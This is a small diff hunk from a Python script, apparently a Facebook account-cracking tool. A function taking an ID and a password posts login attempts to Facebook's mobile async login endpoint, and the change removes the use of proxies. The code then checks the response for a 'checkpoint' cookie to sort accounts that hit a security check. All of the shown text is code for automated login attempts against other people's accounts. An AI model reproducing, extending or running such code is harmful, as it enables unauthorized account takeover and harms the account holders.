@@ -1110,7 +1110,7 @@ def m4(idf,pwv):
       "accept-encoding": "gzip, deflate br",
       "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
       }
-      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
